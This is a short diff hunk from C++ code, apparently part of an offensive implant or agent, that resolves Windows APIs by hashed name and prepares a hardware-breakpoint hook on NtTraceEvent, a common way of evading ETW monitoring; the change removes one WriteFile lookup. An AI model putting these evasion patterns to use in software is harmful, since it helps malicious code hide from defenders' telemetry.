@@ -328,7 +328,6 @@ auto DECLFN LoadEssentials( INSTANCE* Instance ) -> VOID {
     Instance->Win32.GetProcessHeap = (decltype(Instance->Win32.GetProcessHeap))LoadApi(Kernel32, HashStr("GetProcessHeap"));
 
     Instance->Win32.RtlSecureZeroMemory = (decltype(Instance->Win32.RtlSecureZeroMemory))LoadApi(Kernel32, HashStr("RtlZeroMemory"));
-    Instance->Win32.WriteFile = (decltype(Instance->Win32.WriteFile))LoadApi(Kernel32, HashStr("WriteFile"));
 
     Instance->Hwbp.NtTraceEvent   = (PVOID)LoadApi(Ntdll, HashStr("NtTraceEvent"));
 }
